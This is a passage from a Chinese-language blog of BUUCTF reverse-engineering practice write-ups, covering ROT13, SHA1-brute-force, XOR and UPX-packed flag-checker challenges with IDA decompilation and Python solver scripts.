f:公钥加密结果  key:私钥</span></span><br></pre></td></tr></table></figure>

<h1 id="8-login"><a href="#8-login" class="headerlink" title="8.login"></a>8.login</h1><p>拿到题目，是html文件，用vscode打开</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Html</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>FLARE On 2017<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Enter the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;prompt&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click to check the flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);&#125;);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Correct flag!&quot;</span>);</span></span><br><span class="line"><span class="javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p> 这里就是输入的flag如果当前的字符是字母就要replace掉，</p>
<p>replace里面是个嵌套的三目运算符，先判断是否是大写字母，如果是就赋值当前字符<code>c</code>为90，如果不是，就赋值为122，如果赋值完后的字符<code>c1</code>大于等于没赋值前的字符<code>c + 13</code>，<code>c2 = c + 13</code>就把这个字符<code>c1</code>赋值给<code>c2</code>，如果小于则赋值给 <code>c2-26</code></p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>) <span class="keyword">or</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">            t1 = j</span><br><span class="line">            t2 = j + <span class="number">13</span></span><br><span class="line">            <span class="keyword">if</span> (j &lt; <span class="number">90</span>) <span class="keyword">or</span> (j == <span class="number">90</span>):</span><br><span class="line">                j = <span class="number">90</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                j = <span class="number">122</span></span><br><span class="line">            <span class="keyword">if</span> (j &gt; t2) <span class="keyword">or</span> (j == t2):</span><br><span class="line">                j = t2</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                j = t2 -<span class="number">26</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) == s[i]:</span><br><span class="line">                flag = flag + <span class="built_in">chr</span>(t1)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">chr</span>(j) == s[i]:</span><br><span class="line">            flag = flag + <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221213110731736.png" alt="image-20221213110731736"></p>
<h1 id="9-CrackRTF"><a href="#9-CrackRTF" class="headerlink" title="9.CrackRTF"></a>9.CrackRTF</h1><p>参考了一位大佬的博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43786458/article/details/102488408">(164条消息) BUUCTF reverse：CrackRTF_Lk k k的博客-CSDN博客</a></p>
<p>知道了第一个密码是哈希的sha1加密，并且输入前半段的范围是要大于100000的，而且必须得是6位，这就得出范围是100000-999999，用python遍历爆破</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221218010348307.png" alt="image-20221218010348307"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>, <span class="number">1000000</span>):</span><br><span class="line">    s = <span class="built_in">str</span>(i) + <span class="string">&#x27;@DBApp&#x27;</span></span><br><span class="line">    sha = hashlib.sha1(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> sha == <span class="string">&#x27;6e32d0943418c2c33385bc35a1470250dd8923a9&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<p>得到第一个密码是123321</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HRSRC FindResourceA(</span><br><span class="line">  HMODULE hModule,</span><br><span class="line">  LPCSTR  lpName,</span><br><span class="line">  LPCSTR  lpType</span><br><span class="line">);</span><br><span class="line">FindResourceA function</span><br><span class="line">Determines the location of a resource with the specified type and name in the specified module.</span><br><span class="line">确定具有指定类型和名称的资源在指定模块中的位置。</span><br><span class="line">hModule：处理包含资源的可执行文件的模块。NULL值则指定模块句柄指向操作系统通常情况下创建最近过程的相关位图文件。</span><br><span class="line">lpName：指定资源名称。</span><br><span class="line">lpType：指定资源类型。</span><br><span class="line">返回值：如果函数运行成功，那么返回值为指向被指定资源信息块的句柄。为了获得这些资源，将这个句柄传递给LoadResource函数。如果函数运行失败，则返回值为NULL。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">openai:</span><br><span class="line">hResInfo = FindResourceA(0, (LPCSTR)&#x27;e&#x27;, &quot;AAA&quot;)这个函数调用的含义</span><br><span class="line">是？</span><br><span class="line"></span><br><span class="line">FindResourceA()函数用于查找资源，它接受三个参数：hModule（可以为NULL）、lpName（资源名）和lpType（资源类型）。在此调用中，hModule为NULL，lpName为&#x27;e&#x27;，lpType为&quot;AAA&quot;，表示查找名为&#x27;e&#x27;、类型为&quot;AAA&quot;的资源。</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __cdecl <span class="title">sub_4014D0</span><span class="params">(LPCSTR lpString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  LPCVOID lpBuffer; <span class="comment">// [esp+50h] [ebp-1Ch]</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+58h] [ebp-14h]</span></span><br><span class="line">  DWORD nNumberOfBytesToWrite; <span class="comment">// [esp+5Ch] [ebp-10h]</span></span><br><span class="line">  HGLOBAL hResData; <span class="comment">// [esp+60h] [ebp-Ch]</span></span><br><span class="line">  HRSRC hResInfo; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+68h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  hFile = <span class="number">0</span>;</span><br><span class="line">  hResData = <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">  hResInfo = FindResourceA(<span class="number">0</span>, (LPCSTR)<span class="string">&#x27;e&#x27;</span>, <span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hResInfo )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = SizeofResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  hResData = LoadResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  <span class="keyword">if</span> ( !hResData )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  lpBuffer = LockResource(hResData);</span><br><span class="line">  sub_401005(lpString, (<span class="keyword">int</span>)lpBuffer, nNumberOfBytesToWrite);</span><br><span class="line">  hFile = CreateFileA(<span class="string">&quot;dbapp.rtf&quot;</span>, <span class="number">0x10000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hFile == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着还有第二个密码的加密</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230217172025368.png" alt="image-20230217172025368"></p>
<p>这个0x8003就是对数据进行md5编码，但由于他第二个加密并没有说明范围，所以不能进行爆破</p>
<p>下面又有一个函数sub_40100F，点进去看一看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __cdecl <span class="title">sub_4014D0</span><span class="params">(LPCSTR lpString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  LPCVOID lpBuffer; <span class="comment">// [esp+50h] [ebp-1Ch]</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+58h] [ebp-14h]</span></span><br><span class="line">  DWORD nNumberOfBytesToWrite; <span class="comment">// [esp+5Ch] [ebp-10h]</span></span><br><span class="line">  HGLOBAL hResData; <span class="comment">// [esp+60h] [ebp-Ch]</span></span><br><span class="line">  HRSRC hResInfo; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+68h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  hFile = <span class="number">0</span>;</span><br><span class="line">  hResData = <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">  hResInfo = FindResourceA(<span class="number">0</span>, (LPCSTR)<span class="string">&#x27;e&#x27;</span>, <span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hResInfo )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = SizeofResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  hResData = LoadResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  <span class="keyword">if</span> ( !hResData )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  lpBuffer = LockResource(hResData);</span><br><span class="line">  sub_401005(lpString, (<span class="keyword">int</span>)lpBuffer, nNumberOfBytesToWrite);</span><br><span class="line">  hFile = CreateFileA(<span class="string">&quot;dbapp.rtf&quot;</span>, <span class="number">0x10000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hFile == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HRSRC <span class="title">FindResourceA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCSTR  lpName,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCSTR  lpType</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">FindResourceA function</span><br><span class="line">Determines the location of a resource with the specified type <span class="keyword">and</span> name in the specified <span class="keyword">module</span>.</span><br><span class="line">确定具有指定类型和名称的资源在指定模块中的位置。</span><br><span class="line">hModule：处理包含资源的可执行文件的模块。<span class="literal">NULL</span>值则指定模块句柄指向操作系统通常情况下创建最近过程的相关位图文件。</span><br><span class="line">lpName：指定资源名称。</span><br><span class="line">lpType：指定资源类型。</span><br><span class="line">返回值：如果函数运行成功，那么返回值为指向被指定资源信息块的句柄。为了获得这些资源，将这个句柄传递给LoadResource函数。如果函数运行失败，则返回值为<span class="literal">NULL</span>。</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230422114943240.png" alt="image-20230422114943240"></p>
<p>然后后面还有个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_401005(lpString, (<span class="keyword">int</span>)lpBuffer, nNumberOfBytesToWrite);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">sub_401420</span><span class="params">(LPCSTR lpString, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+54h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = lstrlenA(lpString);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a2) ^= lpString[i % v5];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>资源的每一位和密码的每一位循环异或<br>异或结束之后，生成一个rtf文件</p>
<p>我们现在想要的是前六位的密码，循环异或的话，那么也就是说，资源的前六位与密码的前六位异或的结果就是rtf文件的前六位</p>
<p>接下来没思路了，看了一个大佬的思路，可以借鉴一下</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230425171946122.png" alt="image-20230425171946122"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43786458/article/details/102488408">(198条消息) BUUCTF reverse：CrackRTF_Lk k k的博客-CSDN博客</a></p>
<h1 id="10-WUSTCTF2020-level1"><a href="#10-WUSTCTF2020-level1" class="headerlink" title="10.[WUSTCTF2020]level1"></a>10.[WUSTCTF2020]level1</h1><p>拿到文件，日常检查</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230425174324824.png" alt="image-20230425174324824"></p>
<p>然后本来想在虚拟机下直接运行看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230425174423061.png" alt="image-20230425174423061"></p>
<p>但是发生了这样的错误</p>
<p>于是就搜索了一番</p>
<p>什么是段错误？<br>“ 段错误(segmentation fault)”是指你的程序尝试访问不允许访问的内存地址的情况。这可能是由于：</p>
<p>试图解引用空指针（你不被允许访问内存地址 0）；<br>试图解引用其他一些不在你内存（LCTT 译注：指不在合法的内存地址区间内）中的指针；<br>一个已被破坏并且指向错误的地方的 C++ 虚表指针(C++ vtable pointer)，这导致程序尝试执行没有执行权限的内存中的指令；<br>其他一些我不明白的事情，比如我认为访问未对齐的内存地址也可能会导致段错误（LCTT 译注：在要求自然边界对齐的体系结构，如 MIPS、ARM 中更容易因非对齐访问产生段错误）。</p>
<p>知识盲区。。。</p>
<p>只好作罢，开启ida</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230425175818029.png" alt="image-20230425175818029"></p>
<p>题目还给了一个output.txt文件，应该是文件输入输出流，那么进一下main函数看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230425180459859.png" alt="image-20230425180459859"></p>
<p>这里可以看到读入了19长度的字符，如果i是奇数就移位i，如果是偶数就是i*ptr[i]</p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ptr = [<span class="number">198</span>,<span class="number">232</span>,<span class="number">816</span>,<span class="number">200</span>,<span class="number">1536</span>,<span class="number">300</span>,<span class="number">6144</span>,<span class="number">984</span>,<span class="number">51200</span>,<span class="number">570</span>,<span class="number">92160</span>,<span class="number">1200</span>,<span class="number">565248</span>,<span class="number">756</span>,<span class="number">1474560</span>,<span class="number">800</span>,<span class="number">6291456</span>,<span class="number">1782</span>,<span class="number">65536000</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">    <span class="keyword">if</span> ((i+<span class="number">1</span>) &amp; <span class="number">1</span>):<span class="comment">#初始i为0，源程序i为1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(ptr[i] &gt;&gt; (i+<span class="number">1</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">chr</span>(ptr[i] // (i+<span class="number">1</span>)),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="11-GUET-CTF2019-re1"><a href="#11-GUET-CTF2019-re1" class="headerlink" title="11.[GUET-CTF2019]re1"></a>11.[GUET-CTF2019]re1</h1><p>日常检查</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230428170724702-16826728456221.png" alt="image-20230428170724702"></p>
<p>upx壳，先脱壳</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230428171023209.png" alt="image-20230428171023209"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230428171054773.png" alt="image-20230428171054773"></p>
<p>还是想在Ubuntu下运行看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230428171225444.png" alt="image-20230428171225444"></p>
<p>那么结果清晰明了，这就是个输入flag并检验的程序</p>
<p>拖入ida</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230428171351664-16826732319703.png" alt="image-20230428171351664"></p>
<p>查看字符串信息</p>
<p>双击Correct!，并进入他的引用函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230428171505732.png" alt="image-20230428171505732"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400E28</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// er9</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_40F950((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;input your flag:&quot;</span>, a2, a3, a4, a5, a6, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_40FA80((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%s&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v11, v6, v7, v8, v9, v11);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_4009AE(&amp;v11) )</span><br><span class="line">    sub_410350(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_410350(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v12 )</span><br><span class="line">    sub_443550();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_40F950是一个输入函数</p>
<p>进入到sub_40FA80</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 